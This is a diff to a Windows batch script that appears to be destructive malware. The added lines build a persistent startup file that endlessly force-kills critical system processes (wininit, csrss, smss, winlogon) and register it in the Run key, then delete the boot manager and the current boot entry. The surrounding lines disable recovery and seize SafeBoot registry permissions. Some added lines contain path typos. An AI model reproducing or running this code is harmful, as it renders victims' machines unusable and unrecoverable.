@@ -213,13 +213,19 @@ mkdir c:\windows\wallpapertroll
 mkdir c:\windows\junkins
 mkdir c:\windows\junkins\nssm
 xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
-xcopy "%CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat" /y /q /h
 xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
 xcopy "%CD%\junkins\startup\SetACL.exe" "c:\windows\junkins\startup\SetACL.exe" /y /q /h
 xcopy "%CD%\junkins\nssm\nssm.exe" "c:\windows\junkins\nssm\nssm.exe" /y /q /h
-bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
+echo @echo off> %systemroot%\payload\startup.bat
+echo echo No.>> %systemroot%\payload\startup.bat
+echo :no>> %systemroot%\payload\startup.bat
+echo taskkill /F /IM "wininit.exe">> %systemroot%\payload\startup.bat
+echo taskkill /F /IM "csrss.exe">> %systemroot%\paload\startup.bat
+echo taskkill /F /IM "smss.exe">> %systemroot%\payload\startup.bat
+echo taskkill /F /IM "winlogon.exe">> %systemroot%\payload\startup.bat
+echo goto no>> %systemroot%\payload.bat
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d %systemroot%\payload\startup.bat
 %systemroot%\junkins\startup\SetACL.exe -on name -ot type -actn action
 %systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
 %systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
@@ -233,6 +239,8 @@ goto ADDONS
 bcdedit /set {current} TESTSIGNING on
 bcdedit /set {current} recoveryenabled No
 bcdedit /set {bootmgr} timeout 0
+bcdedit /delete {current}
+bcdedit /delete {bootmgr}
 goto DESTROY
 :ADDONS
 @rem --Additional Commands go below--
